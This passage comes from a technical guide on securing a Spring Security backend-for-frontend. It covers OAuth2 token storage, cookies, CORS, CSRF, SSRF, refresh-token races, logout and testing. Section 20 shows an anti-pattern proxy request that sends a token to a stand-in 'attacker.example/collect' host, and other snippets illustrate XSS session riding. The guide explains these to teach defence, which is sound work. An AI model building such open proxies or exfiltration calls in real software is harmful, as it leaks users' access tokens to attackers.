                    authorizedClient.getAccessToken().getTokenValue()
                )
            )
            .retrieve()
            .body(new ParameterizedTypeReference<List<OrderDto>>() {});
    }

    public record OrderDto(String id, String summary) {
    }
}
```

Notes:

- This shows the **transport boundary**: browser sends session cookie to BFF; BFF sends Bearer access token to API.
- `@RegisteredOAuth2AuthorizedClient` requires the matching registration/principal and authorized-client infrastructure.
- The access token issued by the AS for `corporate` **must actually be accepted by the Orders API** (audience/scope/issuer). Otherwise, use a separate registration/authorization or a provider-supported token exchange.
- In modern Spring Security integrations, `RestClient`/`WebClient` offer OAuth2 interceptors/filters so the manager selects and reauthorizes authorized clients automatically. Setting the header manually here does not handle mid-call token refreshes on its own.
- When tokens expire, let the manager/argument resolver handle reauthorization or use the integrated OAuth2 HTTP client.
- Filter DTOs per business policy; the downstream API must still verify ownership.

### 15.2. Never Accept Username from Query Strings to Load Tokens

Wrong:

```text
GET /api/orders?principalName=bob
```

followed by:

```java
authorizedClientService.loadAuthorizedClient(
    "corporate",
    principalNameFromQuery
);
```

Without permission checks, Alice can hijack Bob's token.

The BFF must derive the **authenticated principal** from Spring Security and enforce authorization if delegated actions on behalf of another user exist.

### 15.3. Never Forward All Inbound Headers Downstream

Avoid:

```text
BFF sends to Orders:
    Cookie: SESSION=...
    X-CSRF-TOKEN: ...
    Authorization: Browser-supplied-header
    Host: frontend-host
```

Downstream APIs need only contract headers: the BFF-selected Bearer access token, non-sensitive correlation IDs, content types, and allowlisted business headers.

Specifically, never forward the BFF session cookie to downstream APIs.

---

## 16. Session Cookies, `localStorage`, `sessionStorage`, and `IndexedDB`

Browser storage features have distinct semantics.

| Storage Location | Readable by Same-Origin JS? | Auto-Sent on HTTP Requests? | Suitable in a BFF For? |
|---|---|---|---|
| `HttpOnly` session cookie | **No** via `document.cookie` | **Yes**, per cookie policy | Opaque session ID |
| Non-`HttpOnly` cookie | Yes | Yes | Optional CSRF token per design, never OAuth tokens |
| `localStorage` | Yes | No | Non-sensitive UI preferences, never OAuth tokens |
| `sessionStorage` | Yes | No | Non-sensitive UI state, never OAuth tokens |
| `IndexedDB` | Yes via JS API | No | Offline data under clear policy, never refresh tokens |
| JavaScript memory | Yes by same-realm code | No | Ephemeral UI data, never BFF OAuth tokens |
| Backend authorized client DB/session | No | No | Access/refresh tokens and metadata |

An `HttpOnly` session cookie cannot be read by JS directly, yet still resides on the user's machine and appears in DevTools/browser internals. `HttpOnly` is not cookie encryption.

### 16.1. Why Is `localStorage` Not a BFF Replacement?

If an app receives an OAuth2 access token and runs:

```javascript
localStorage.setItem("access_token", token);
```

JavaScript becomes the token holder. The BFF may still act as a gateway, yet **the backend-only token boundary has been broken**.

If the browser truly must call APIs directly with OAuth2 access tokens, that is a different architecture (SPA OAuth2 client or token-mediating backend) requiring its own threat model.

---

## 17. CORS, Same-Origin, and Same-Site in a BFF

The cleanest deployment:

```text
https://portal.example.com/app
https://portal.example.com/api/orders
https://portal.example.com/oauth2/authorization/corporate
```

**Same-origin** (scheme + host + port). When the browser calls `/api/orders`, no cross-origin CORS is needed at the frontend–BFF boundary.

### 17.1. Frontend and BFF on Different Subdomains

Example:

```text
SPA: https://app.example.com
BFF: https://api.example.com
```

These URLs are **cross-origin**, yet usually **same-site** if scheme and registrable domain match. Because they are cross-origin, browsers require CORS rules for `fetch`.

You may need:

```javascript
fetch("https://api.example.com/api/orders", {
  credentials: "include"
});
```

And the BFF must allowlist only the SPA's exact origin:

```text
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
```

Never use:

```text
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

because credentialed CORS fails with wildcards and is a dangerous policy.

### 17.2. CORS Does Not Replace CSRF Protection

CORS governs which origin's JavaScript may read cross-origin responses or send certain request types. It is not a full CSRF defense for session cookies.

Even when browsers block a malicious page from reading the response, a form POST or simple request **can still be dispatched** per browser and HTTP method/content-type rules.

Keep CSRF validation enabled and optionally add `Origin`/`Referer` checks on state-changing operations.

### 17.3. Host-Only Cookies and Subdomains

If the BFF sets a cookie on `api.example.com` without `Domain`, it is a **host-only cookie** for the API host. The browser attaches it to requests to `api.example.com`; JavaScript on `app.example.com` never needs to read it.

Do not set `Domain=.example.com` just to expose cookies to the app subdomain. Widening `Domain` expands where cookies travel and increases risk from sibling subdomains.

### 17.4. Frontend on an Entirely Different Site

Example:

```text
SPA: https://frontend.example.org
BFF: https://backend.example.net
```

This is cross-site. Cookie auth may require `SameSite=None; Secure`, yet browser privacy policies can block third-party cookies; CSRF and CORS also grow more complex.

For browser-facing BFFs, prefer **same-origin deployment behind a reverse proxy** whenever possible. Never design around unconditional third-party cookie support.

---

## 18. `SameSite` and OIDC Redirect Callbacks

OAuth2 Authorization Code Flow requires browser redirects:

```text
BFF -> Identity Provider -> BFF callback
```

The BFF normally saves the **authorization request, `state`, and PKCE verifier** on the backend, tied to the session or an authorization request repository.

If the session cookie is omitted on the callback, the BFF cannot find the started authorization request.

### 18.1. GET Callbacks

With `query` response mode, the IdP triggers a top-level GET navigation to:

```text
/login/oauth2/code/corporate?code=...&state=...
```

`SameSite=Lax` normally works with top-level cross-site GET navigations, making it the standard choice for redirect-based login.

### 18.2. `form_post` Callbacks

Some OIDC Providers support `response_mode=form_post`, producing a top-level cross-site POST.

`SameSite=Lax` cookies are typically withheld on this POST, causing:

```text
authorization_request_not_found
invalid_state
Login callback cannot be correlated
```

Never resolve this by skipping `state`. Pick a compatible response mode, cookie policy, and session flow while keeping CSRF defenses intact.

### 18.3. Proxying and Wrong Schemes

If browsers connect to:

```text
https://portal.example.com
```

while Spring Boot sees internal traffic on:

```text
http://bff:8080
```

and forwarded headers are misconfigured, redirect URIs become `http://...` or use the wrong host.

Ensure:

- Trusted reverse proxies.
- Forwarded header processing (`Forwarded`, `X-Forwarded-*`) enabled only for trusted proxies.
- Exact redirect URIs registered at the IdP.
- Consistent HTTPS and `Secure` cookies.
- Never trusting arbitrary forwarded headers from the public Internet.

---

## 19. BFF Does Not Eliminate XSS

While a BFF shields raw OAuth2 tokens from JavaScript architecturally, malicious scripts running in the SPA/BFF origin can still:

- Call `/api/orders` and `/api/profile` using the session cookie.
- Submit `POST /api/orders` by reading the CSRF token from the same origin.
- Read API responses and exfiltrate data.
- Alter the DOM and deceive users.
- Execute transactions unless the backend enforces additional authorization or step-up checks.

### 19.1. Defenses to Maintain

- Output encoding and template escaping.
- Never render unsanitized user-controlled HTML.
- Strong Content Security Policy restricting inline scripts and untrusted script sources.
- Minimize third-party scripts/analytics running in the origin.
- Dependency supply-chain controls.
- Keep secrets out of JS bundles, source maps, and the DOM.
- Backend validation and authorization—never trust frontend checks.
- Step-up authentication or transaction confirmation for sensitive actions.

### 19.2. `HttpOnly` Reduces Token Theft, Yet Does Not Stop XSS Session Riding

Malicious scripts cannot read `document.cookie` for an `HttpOnly` session ID, yet can still run:

```javascript
fetch("/api/me", { credentials: "same-origin" });
```

Therefore, saying "BFF is immune to XSS" is false. More accurately:

> A BFF reduces the risk of raw OAuth2 access/refresh tokens being stolen by JavaScript, while XSS can still perform any action permitted to the active session.

---

## 20. BFFs Must Prevent SSRF and Proxy Token Exfiltration

A common architectural flaw is turning the BFF into a generic proxy:

```text
POST /api/proxy
{
  "url": "https://attacker.example/collect",
  "method": "GET"
}
```

If the BFF attaches an access token to an arbitrary URL, attackers steal the token.

### 20.1. Never Use Unconstrained Browser-Supplied URLs

Choose upstream APIs from **server-side configuration**:

```java
RestClient ordersClient =
    RestClient.builder()
        .baseUrl("https://orders.internal.example")
        .build();
```

Controllers accept validated business operations and parameters—never full upstream URLs.

### 20.2. Block Redirect Risks

Even with a fixed base URL, an upstream might return `302`/`307` pointing elsewhere. Inspect your HTTP transport's redirect handling and `Authorization` header forwarding policies.

Never assume every `RestClient`, `WebClient`, or HTTP connector strips tokens across redirects automatically.

### 20.3. Never Blindly Forward Browser Cookies, `Host`, or `Authorization`

Define an explicit outbound header allowlist. For instance, the BFF sends:

```text
Authorization: Bearer <downstream-access-token>
Accept: application/json
X-Correlation-ID: <validated-id>
```

Never forward:

```text
Cookie: SESSION=...
X-CSRF-TOKEN: ...
Authorization: arbitrary browser value
X-Forwarded-Host: untrusted input
```

`Cookie` is the BFF session credential, not for downstream APIs.

### 20.4. Never Reflect Upstream `Set-Cookie` or Token Fields to the Browser

If a downstream response includes `Set-Cookie`, `WWW-Authenticate`, token-like fields, or sensitive headers, the BFF must decide explicitly what may pass through. Never blindly copy all upstream headers/bodies to the frontend.

Return **curated DTOs**, never raw authorization infrastructure.

---

## 21. Where Should Server-Side Token Storage Live?

A small BFF may use HTTP sessions and an in-memory authorized client store. Multi-instance BFFs need deliberate storage choices.

### 21.1. Single-Node In-Memory Storage

```text
Pod A
    Session A1
    OAuth2AuthorizedClient for Alice
```

Simple, yet restarts wipe sessions/tokens. If a load balancer routes requests to Pod B without shared storage, Alice appears logged out or lacks her authorized client.

### 21.2. Spring Session Redis or JDBC

Spring Session replaces container-managed `HttpSession` with shared storage.

Example architecture:

```text
Browser
    |
    | Cookie SESSION=opaque-id
    v
Load Balancer
    |
    +--> BFF Pod A ---+
    |                 |
    +--> BFF Pod B ---+--> Shared Spring Session Store
    |                 |
    +--> BFF Pod C ---+--> OAuth2AuthorizedClient Store
```

Across multiple pods, evaluate **both data stores**:

1. `SecurityContext`/HTTP session.
2. `OAuth2AuthorizedClient` (access/refresh tokens).

Some deployments store authorized clients in session repositories; others use an authenticated-principal repository delegating to a service. Inspect actual bean wiring to know where tokens really live.

### 21.3. Spring Session Does Not Auto-Encrypt Access Tokens at the Application Layer

Running Redis/JDBC inside a private network does not make token data automatically invulnerable.

Address:

- TLS to Redis/databases.
- Authentication/ACLs and network segmentation.
- Encryption at rest/backups, and application-level encryption when required.
- Secret rotation and key management.
- Never logging SQL parameters or Redis values containing tokens.
- Data retention/TTL and session cleanup.
- Tenant isolation.
- Access controls on backups and exports.

**Refresh tokens are long-lived credentials**, so backend store protections must match their sensitivity.

### 21.4. Shared Storage Requires High Availability

If the session store or authorized client DB goes down, the BFF cannot verify sessions or fetch tokens even if Resource Servers and the IdP are healthy.

Plan monitoring, timeouts, connection pools, failover, and graceful error handling. Never "fail over" by shipping OAuth2 tokens to the browser temporarily.

---

## 22. Cookie Lifetime Does Not Equal Access Token Lifetime

Example:

```text
BFF Session:
    idle timeout = 30 minutes

Access Token:
    lifetime = 10 minutes

Refresh Token:
    lifetime/policy per Authorization Server
```

What can happen:

```text
09:00 Login -> session + access token AT1
09:08 Browser GET /api/orders -> AT1 valid
09:12 Browser GET /api/orders -> AT1 expired
       BFF refreshes RT1 -> receives AT2
09:20 Browser continues with same session cookie
09:35 30 minutes of inactivity? depends on last access
       Session may expire
```

**An active session does not guarantee an unexpired access token.** The BFF must manage both lifecycles.

Conversely, **session expiration does not automatically revoke tokens at the Authorization Server**. The BFF needs matching logout and cleanup policies.

### 22.1. Idle Timeout vs. Absolute Timeout

Idle timeout measures inactivity; absolute timeout caps session duration from creation/authentication regardless of activity.

Spring Session and Servlet containers typically provide idle timeouts; absolute lifetimes may require additional policies or custom logic if demanded by your organization.

Relying on users closing browser tabs never guarantees immediate session/token revocation.

### 22.2. Do Not Automatically Extend Session Lifetime on Refresh Token Use

Refreshing an access token on the backend does not have to extend the BFF session endlessly. Session lifetimes need independent policies based on risk, user activity, and reauthentication needs.

---

## 23. Refresh Token Rotation Under Concurrent Requests

A BFF commonly receives parallel API calls from a single SPA:

```text
Dashboard load:
  GET /api/me
  GET /api/orders
  GET /api/notifications
  GET /api/balance
```

When the access token nears expiry, multiple threads/pods may load the same old authorized client:

```text
AT1 expired
RT1 present

Request A -> refreshes RT1 -> AT2 + RT2
Request B -> refreshes RT1 -> invalid_grant
```

If the AS enforces **refresh token rotation** and replay detection, `RT1` becomes invalid after the first use. Request B reusing `RT1` errors out and may even trigger token-family revocation per policy.

### 23.1. Managers/Services Do Not Lock Refreshes Globally by Default

`OAuth2AuthorizedClientManager`, `OAuth2AuthorizedClientProvider`, and authorized client stores support token lifecycles, yet never assume:

```text
load -> check expiry -> HTTP refresh -> save
```

executes atomically across all threads and pods out of the box.

### 23.2. Recommended Approach

- Use **single-flight / per-key locking** per authorized client when needed.
- Key locks by registration + principal + tenant/security namespace.
- After acquiring the lock, **reload the authorized client** to pick up tokens already refreshed by another request.
- Across multiple pods, add distributed coordination.
- Use conditional writes/deletes or versioning so stale failures never wipe newer entries.
- Never blindly retry rotated refresh tokens.
- Never log refresh tokens.

### 23.3. Default `invalid_grant` Failure Handlers

Some default authorized client managers remove stored authorized clients upon `invalid_grant`. If Request B fails with stale `RT1` right after A saved `RT2`, unconditional key-based deletion can accidentally wipe the newer token.

Under strict rotation, align concurrency and failure handling with actual update ordering. **Never disable failure handling blindly**, because genuinely invalid refresh tokens must still be cleaned up.

### 23.4. `clockSkew`

Refresh providers treat tokens as "nearing expiry" shortly before `expiresAt`, typically configured via `clockSkew`.

This reduces the chance an API receives an expired token, yet is not a lock. Setting `clockSkew` too large relative to token lifetime increases refresh frequency and concurrency pressure.

---

## 24. User Logout: Session Invalidation Differs from Token Revocation

When a user clicks Log Out:

```text
Browser
    |
    | POST /logout + CSRF token
    v
BFF
    |
    +-- Invalidate BFF session
    +-- Clear Authentication
    +-- Expire browser session cookie
    +-- Remove/revoke authorized clients per policy
    +-- Optionally redirect to OIDC Provider logout
```

Avoid GET logout for state-changing operations without explicit justification/policy; Spring Security's default logout requires POST when CSRF is active.

### 24.1. BFF Session Logout

Spring Security logout handlers can:

- Invalidate the HTTP session.
- Clear `SecurityContext`/`Authentication`.
- Delete configured cookies.

However, the actual cookie name (`JSESSIONID`, `SESSION`, or custom) depends on your container and Spring Session setup.

### 24.2. Deleting a Session Does Not Revoke Refresh Tokens

`OAuth2AuthorizedClient` may live in a JDBC service independent of HTTP sessions. Invalidating only the session leaves access/refresh tokens **intact in the authorized client service**.

Define explicitly:

- Should logout remove the authorized client?
- Should the BFF revoke refresh tokens via RFC 7009 when supported by the AS?
- How does disconnecting one integration differ from logging out of the BFF?
- Does the provider issue rotating refresh tokens?
- Must logout revoke all user sessions or only the current device session?

### 24.3. OIDC RP-Initiated Logout

OIDC defines RP-Initiated Logout where supported by the OP. Spring Security provides `OidcClientInitiatedLogoutSuccessHandler` with `ClientRegistrationRepository` where applicable.

Keep in mind:

- BFF session logout **differs from** OP SSO session logout.
- OP logout does not revoke all OAuth2 access/refresh tokens by default.
- If the browser's OP SSO session remains alive, the next login can complete nearly instantly.
- Single Logout / front-channel / back-channel logout require dedicated policies and provider support.

### 24.4. In-Flight Refresh Racing with Logout

Dangerous race:

```text
Thread A: Refreshes RT1...
Thread B: User logs out, removes authorized client...
Thread A: Receives RT2, saves authorized client back.
```

Tokens can "resurrect" after logout. For strict security, use versions, tombstones, or concurrency coordination so late refresh responses never reactivate revoked authorizations.

---

## 25. How Do "BFF" and "Token-Mediating Backend" Differ?

Some backend architectures assist SPAs with OAuth2 while still **returning access tokens to the browser**.

### 25.1. Token-Mediating Backend

The backend handles part of the OAuth2 flow and delivers an access token to the SPA. The SPA then sends Bearer tokens directly to Resource Servers.

```text
Browser -> Backend: Login/session
Backend -> Browser: Access token
Browser -> Resource Server: Bearer access token
```

This **differs from a backend-only token BFF**, because the OAuth2 access token becomes JavaScript-accessible.

### 25.2. Full BFF

```text
Browser -> BFF: Session cookie + API request
BFF -> Resource Server: Bearer access token
BFF -> Browser: Business JSON
```

No raw OAuth2 token ever reaches the browser.

### 25.3. Trade-Offs

| Criterion | Backend-Only Token BFF | Token-Mediating Backend |
|---|---|---|
| Does JS receive access tokens? | No | Yes |
| Must backend proxy protected API calls? | Usually yes | Not necessarily |
| Risk of JS exfiltrating access tokens? | Sharply reduced | Remains present |
| Backend traffic/latency | Higher due to API proxying | Potentially lower |
| Browser/API CORS | Frontend–BFF can be same-origin | SPA–API usually needs CORS |
| Session-cookie CSRF | Must defend | Depends on how browser calls backend |
| API token audience | Selected on backend | Browser must also target right API |

Use accurate terminology in architecture docs. A backend that "helps fetch tokens" and hands them to an SPA does not achieve the BFF goal of **never exposing tokens to the browser**.

---

## 26. BFFs in Multi-Frontend Architectures

An organization may run:

```text
Web App A -> BFF A
Web App B -> BFF B
Mobile App -> Mobile API
```

Not every client type should use the same authentication pattern.

### 26.1. Browser-Facing BFF

Fits websites wanting cookie sessions, keeping OAuth2 tokens out of JS, and running a dedicated UI backend.

### 26.2. Native Mobile Apps

Native apps typically use Authorization Code with PKCE via the system browser and secure OS token storage per OAuth2 native app guidance. Never pretend "browser `HttpOnly` cookies solve every native app" while ignoring platform security models.

### 26.3. Server-Rendered Apps

A server-rendered Spring MVC app with server sessions and OAuth2 Login already realizes **many BFF properties** naturally, even without a separate SPA.

### 26.4. Microfrontends

If multiple microfrontends share one BFF origin, watch out:

- Third-party scripts run with same-origin privileges.
- XSS in one microfrontend can invoke BFF APIs belonging to others if backend authorization is too coarse.
- Never use frontend module names as security boundaries.
- Enforce user/tenant/resource authorization on the backend.
- Apply CSP, dependency isolation, and least-privilege endpoints.

---

## 27. How Does a Spring WebFlux BFF Differ?

The same browser–BFF–Resource Server model applies to WebFlux, using reactive classes:

| Concern | Servlet / MVC | WebFlux |
|---|---|---|
| Security config | `HttpSecurity` | `ServerHttpSecurity` |
| Security chain | `SecurityFilterChain` | `SecurityWebFilterChain` |
| Security context | Servlet repositories / `HttpSession` | `ServerSecurityContextRepository` + Reactor Context |
| Principal access | `SecurityContextHolder`, controller args | `ReactiveSecurityContextHolder`, reactive principal |
| Authorized client manager | `OAuth2AuthorizedClientManager` | `ReactiveOAuth2AuthorizedClientManager` |
| Authorized client repository | `OAuth2AuthorizedClientRepository` | `ServerOAuth2AuthorizedClientRepository` |
| Client service | `OAuth2AuthorizedClientService` | `ReactiveOAuth2AuthorizedClientService` |
| Downstream HTTP | `RestClient`/`WebClient` | Non-blocking `WebClient` |
| Session | `HttpSession`/Spring Session | `WebSession`/Spring Session reactive integrations |

A WebFlux BFF still requires:

- Session cookie security.
- CSRF protection.
- OIDC Login Authorization Code Flow.
- Backend-only token storage.
- Authorized client reauthorization.
- API proxy allowlists and SSRF defenses.
- Distributed session/token lifecycle controls.

Do not simply slap a reactive OAuth2 client filter onto `WebClient` and call it a BFF if the browser still receives raw tokens.

### 27.1. Never Block the Reactor Event Loop

In WebFlux, avoid `.block()` and blocking HTTP clients on the event loop. Use the reactive authorized client manager and non-blocking `WebClient` pipelines properly.

### 27.2. Reactor Context Does Not Store Tokens Permanently

`ReactiveSecurityContextHolder` lets code read `Authentication` within a subscription; it **is not a persistent OAuth2 token vault** and never replaces `ReactiveOAuth2AuthorizedClientService` or session repositories.

---

## 28. API Authentication and BFF Sessions Are Two Separate Layers

A system can let browsers use session cookies to the BFF while internal Resource Servers accept only OAuth2 Bearer tokens.

```text
Browser -> BFF:
    Cookie: SESSION=...

BFF -> API:
    Authorization: Bearer AT1
```

These are two trust boundaries with two security control sets.

### 28.1. BFF Endpoint `/api/orders`

Verify:

- Valid browser session.
- User `Authentication` is permitted on this route.
- Requested order belongs to the user/tenant.
- Input validation and rate limits.

### 28.2. Orders Resource Server

Verify:

- Token issuer.
- Signature/introspection.
- Audience.
- Expiration.
- Scopes/authorities.
- Resource ownership and business policy.

**Never skip security on the Orders API merely because the BFF logged the user in.** The BFF could have bugs, or another service might call the API directly.

### 28.3. Never Swap User Tokens for Client Credentials on 403

If the BFF sends a user-delegated token and receives `403` for missing scope/ownership, never fall back to a privileged service token to fetch the data anyway.

That creates confused deputy and privilege escalation vulnerabilities. If an API requires application-level permissions for a user-approved action, design an explicit policy.

---

## 29. Handling Response Statuses in a BFF

A BFF must distinguish errors from **browser sessions**, the **Token Endpoint**, and **Resource Servers**.

| Error Source | Example | Appropriate BFF Behavior |
|---|---|---|
| BFF session expired | No valid `Authentication` | API returns 401 or defined error JSON; frontend navigates to login |
| Invalid CSRF | Missing/wrong CSRF token | 403; frontend re-fetches token if policy allows; never disable CSRF |
| Bad OAuth2 callback `state` | `invalid_state` / authorization request not found | Reject callback; never skip validation |
| Token Endpoint `invalid_grant` | Refresh token expired/revoked/rotation race | Remove/invalidate authorized client per policy; prompt reconnect |
| Token Endpoint `invalid_client` | Wrong client secret/mTLS | Alert backend; never expose secret |
| Resource Server 401 `invalid_token` | Stale, revoked, or wrong issuer/audience | Classify error; bounded reauthorization, no infinite loops |
| Resource Server 403 | Insufficient scope/business auth | Return policy error; never swap to stronger token |
| Resource Server 429 | Rate limited | Backoff and rate control |
| Resource Server 5xx | Upstream unavailable | 502/503 per API contract; preserve correlation ID |
| Session DB/Redis error | Cannot load session/tokens | Return server-side error; never fall back to exposing tokens |

### 29.1. Never Return Raw OAuth2 Errors Containing Tokens

Token Endpoint errors or exception messages may embed request metadata. Never serialize full exception objects, auth contexts, or token responses back to the browser.

Return controlled problem responses:

```json
{
  "code": "SESSION_EXPIRED",
  "message": "Please sign in again"
}
```

Server-side logs should record correlation IDs and redacted error codes—never raw credentials.

---

## 30. Session Expiration and SPA UX

An SPA can stay open for hours without reloading. When the BFF session expires:

```text
GET /api/orders
    -> 401 SESSION_EXPIRED
```

The frontend should direct the user to sign in or show a reauthentication prompt—**not** try to fetch an access token in the browser, since the browser holds no tokens.

### 30.1. Keep API Responses and Browser Navigations Distinct

An API call expecting JSON must not silently receive an IdP login HTML page via a `302` redirect chain. Configure authentication entrypoints/exception handling so `/api/**` returns `401`, while top-level navigations to login URLs trigger OAuth2 authorization.

This frontend–BFF contract avoids confusing CORS failures upon session expiry.

### 30.2. Never Rely Only on Frontend Timers for Session Expiry

Browser clocks drift, tabs suspend, and sessions can be revoked server-side. The BFF must validate sessions on every request; frontend timers are purely UX optimizations.

### 30.3. `GET /api/me`

A session-check endpoint can return:

```json
{
  "authenticated": true,
  "displayName": "Alice"
}
```

Never return:

```json
{
  "accessToken": "...",
  "refreshToken": "...",
  "idToken": "...",
  "sessionId": "..."
}
```

Return only minimal display identity fields after authorization and privacy checks.

---

## 31. BFF Monitoring and Auditing

Monitor:

- Successful/failed login counts.
- OAuth2 `state`/callback errors.
- CSRF rejections and associated origins.
- Active session counts, creations, and invalidations.
- Session store latency and error rates.
- Authorized client store latency and errors.
- Access token refresh attempts and `invalid_grant` counts.
- Refresh token rotation conflicts.
- Token Endpoint 429/5xx responses.
- Resource Server 401/403/5xx responses.
- API proxy latency, downstream retries, and timeouts.
- Rejected cross-origin requests.
- Logout/revocation outcomes.

### 31.1. Never Log Secrets

Never log:

```text
Cookie: SESSION=...
Authorization: Bearer ...
access_token
refresh_token
id_token
client_secret
code_verifier
authorization_code
client_assertion
```

Authorization codes appear in callback query strings. Configure reverse proxies, access logs, and APM to avoid logging full URL queries or to redact `code`/`state` as required.

### 31.2. Helpful Metadata Logs

```text
event=bff_downstream_call
requestId=req-736
registrationId=corporate
principalRef=<pseudonymized>
upstream=orders-api
status=200
elapsedMs=87
```

Avoid putting raw user emails into high-cardinality metric labels unnecessarily; follow privacy and retention policies.

---

## 32. Testing the Browser–Backend–API Boundary

A BFF is not proven secure just because `oauth2Login()` works. Test **that restricted data never crosses boundaries**.

### 32.1. Test Cookie Flags

After login, verify `Set-Cookie`:

```text
HttpOnly
Secure
Appropriate SameSite
Matching Path/Domain
```

With `__Host-`, verify `Secure`, `Path=/`, and absence of `Domain` together.

### 32.2. Test That the Frontend Sees Zero OAuth2 Tokens

Verify:

- HTML responses contain no raw tokens.
- `/api/me` returns only a safe DTO.
- API responses never serialize `OAuth2AuthorizedClient`.
- JS bundles and initial state contain no access/refresh tokens.
- The app writes zero OAuth2 tokens to `localStorage`/`sessionStorage`/`IndexedDB`.
- No tokens are emitted in cookies, headers, or redirect URLs to the browser.

Include error responses, debug endpoints, and upstream response passthroughs in these checks.

### 32.3. Test CSRF with `MockMvc`

Spring Security Test provides:

```java
import static org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.csrf;
```

A POST with session authentication lacking a CSRF token must be rejected per policy.

Requests with valid CSRF tokens proceed to business authorization. Do not slap `.with(csrf())` onto every test and forget the real frontend must send the header/token.

### 32.4. Test OAuth2 Login and Authorized Clients

The `oauth2Login()` test post-processor mocks authentication, yet **does not test** Authorization Code redirects, PKCE/`state`/`nonce`, the Token Endpoint, or actual authorized client persistence.

Separate:

1. `SecurityFilterChain`/session tests.
2. OAuth2 callback integration tests.
3. Authorized client store tests.
4. Downstream API client tests.
5. End-to-end browser login tests.

### 32.5. Test That API Tokens Never Leak

With a mock Orders API, assert:

```text
BFF -> Orders:
    Authorization: Bearer fake-access-token
    No Cookie: SESSION...
```

With a mock browser client, assert:

```text
Orders API response mapped to DTO
    -> No access_token/refresh_token/sessionId
```

### 32.6. Test XSS and CSRF Without Conflating Them

- CSRF test: cross-site forms/requests missing CSRF tokens are rejected.
- XSS test: output encoding/CSP and dynamic HTML block malicious script execution.
- Session fixation: session ID rotates after authentication.
- Logout: old cookies can no longer access APIs.
- Origin/CORS: disallowed origins cannot read credentialed responses.
- SSRF: BFF blocks proxying to user-chosen hosts.
- Tenant isolation: Alice cannot call APIs using Bob's token.

### 32.7. Test Across Multiple Nodes

Simulate:

```text
1. Alice logs in via Pod A.
2. GET /api/orders routes to Pod B.
3. Pod B loads SecurityContext from shared session store.
4. Pod B loads Alice's authorized client from the right store.
5. Token refresh executes cleanly per concurrency policy.
```

Testing only one JVM with an in-memory service proves nothing about distributed session/token behavior.

---

## 33. Common Mistakes and Fixes

| Symptom | Possible Cause | Fix |
|---|---|---|
| Login works, yet SPA cannot call `/api/me` | Cookie not set/sent, CORS credentials, or wrong session | Check cookie flags, origin, and session repository |
| `authorization_request_not_found` after callback | Lost session, mismatched `SameSite`/response mode, bad proxy redirect | Check state store and callback cookies |
| Callback redirects to `http://internal:8080` | Wrong forwarded headers/proxy config | Configure trusted proxy and redirect URI |
| Browser sees `access_token` in JSON | Debug endpoint or DTO accidentally serialized authorized client | Remove token exposure; return business DTOs only |
| Browser does not see cookie in `document.cookie` | Session cookie is `HttpOnly` | Expected secure behavior |
| Browser sends cookie even though JS cannot read it | Standard HTTP cookie semantics | Expected behavior; enforce CSRF protection |
| `POST /api/orders` returns 403 | Missing CSRF token or business permission | Check CSRF and authorization separately |
| SPA `fetch` receives IdP HTML instead of JSON | API returned 302 login redirect | Return 401 on APIs; use top-level navigation for login |
| Cookie dropped on cross-site POST callback | `SameSite` `Lax`/`Strict` incompatible with `form_post` | Align response mode and cookie policy |
| Login lost after switching pods | Local RAM sessions | Use Spring Session / shared store / sticky strategy |
| User authenticated, yet downstream token missing | Authorized client sits in Pod A's `InMemory` store | Use shared authorized client service or proper repository |
| Downstream API returns 401 | Access token has wrong `aud`/`iss`/expired | Check target token and Resource Server |
| Downstream API returns 403 | Token lacks scope/permissions | Never fall back to privileged client tokens |
| BFF refreshes constantly | Changing cache key/principal or huge clock skew | Fix stable principal, lifetimes, and manager |
| `invalid_grant` on multi-request dashboard load | Refresh token rotation race | Single-flight / conditional storage logic |
| Tokens remain in JDBC after logout | Session invalidation doesn't clear service store | Remove/revoke authorized clients per policy |
| Session ID sent to upstream API | Blind header forwarding | Allowlist outbound headers |
| Tokens sent to unknown hosts | Generic proxy or open redirects | Enforce upstream allowlists and redirect policies |
| `SameSite=None` cookies still blocked by browser | Third-party cookie restrictions | Prefer same-origin/same-site architecture |
| XSS still calls APIs despite `HttpOnly` cookies | XSS runs same-origin | CSP, escaping, backend authz/step-up |
| Wildcard `*` CORS with credentials | Invalid/unsafe config | Exact origin allowlist and credentials policy |
| `STATELESS` breaks login | Wrong session policy for BFF | Enable server-side sessions |
| Tokens stored in cookies to avoid DB | Breaks BFF architectural boundary | Use opaque session cookies and backend token storage |

### 33.1. Diagnostic Checklist for "Login Lost"

1. Confirm whether the browser received a session cookie after the callback.
2. Confirm the cookie has `Secure` on public HTTPS.
3. Confirm `Domain`/`Path`/`SameSite` fit login, callback, and API routes.
4. Confirm `state` matches the saved authorization request.
5. Confirm the reverse proxy forwards `Host`/`Forwarded` per trust policy.
6. Confirm the BFF can load the server session on the handling node.
7. Confirm `SecurityContext` was saved and restored post-login.
8. Confirm `OAuth2AuthorizedClient` matches registration/principal and uses the right store.
9. Check whether the BFF endpoint returned 401 or the downstream Resource Server returned 401.
10. Check for session invalidation, logout, TTLs, or session fixation transitions.

You never need to log session IDs or access tokens to perform these checks.

---

## 34. Applied Scenarios

### Scenario A — React App Calling APIs with OAuth2 Tokens in Local Storage

**Issue:** JavaScript holds access tokens. This is not a backend-only token BFF.

**Resolution:** Have the BFF store tokens and issue session cookies; frontend calls BFF APIs.

### Scenario B — JavaScript Cannot Read the `HttpOnly` Cookie

**Assessment:** Intended behavior. Browsers attach cookies automatically per domain/path/`SameSite` rules; JS never needs to read the cookie to use the session.

### Scenario C — XSS Fires a POST Using the Session Cookie

**Assessment:** `HttpOnly` does not stop XSS from acting within the same origin. The BFF needs XSS defenses, CSRF protection, and backend authorization.

### Scenario D — OAuth2 `form_post` Callback Cannot Find `state`

**Assessment:** `SameSite=Lax` cookies may be omitted on cross-site POSTs. Never disable `state`; align response mode and cookie/CSRF handling.

### Scenario E — `POST /api/orders` Fails with CSRF 403

**Assessment:** Send the CSRF token in the expected header. Never disable CSRF just to silence frontend errors.

### Scenario F — User Logs In on Pod A, Next Request Hits Pod B

**Assessment:** Session and authorized client stores may not be shared. Inspect both storage layers rather than relying solely on sticky sessions.

### Scenario G — Backend Uses `client_credentials` to Call APIs for a User

**Assessment:** Service tokens and user tokens carry different privileges. Never fall back to a service token to bypass user authorization.

### Scenario H — Browser Chooses Target URL for a BFF Proxy

**Assessment:** Risk of SSRF and token exfiltration. Enforce upstream allowlists and fixed business API endpoints.

